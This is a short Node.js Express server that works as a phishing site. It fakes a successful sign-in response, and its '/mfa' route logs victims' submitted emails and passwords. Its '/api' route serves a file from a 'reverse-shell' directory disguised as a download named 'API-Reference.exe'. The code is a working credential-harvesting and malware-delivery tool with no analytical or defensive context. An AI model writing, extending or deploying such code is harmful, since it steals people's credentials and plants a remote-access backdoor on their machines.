const express = require("express");
const bodyParser = require('body-parser');

const app = express();
app.use(express.static('res'));
app.use(bodyParser.urlencoded({ extended: true }));

app.post("/signin", (req, res) => {
    res.send({
        "state": "SUCCESS",
        "properties": {
            "resolvedAccountType": "Decoupled"
        }
    });
})

app.post("/mfa", (req, res) => {
    console.log(req.body.email, req.body.password);
    res.status(401).send();
})

app.get("/api", (req, res) => {
    res.download("../reverse-shell/re.exe", "API-Reference.exe");
})

app.post("/*", (req, res) => res.send());

app.listen(80, () => {});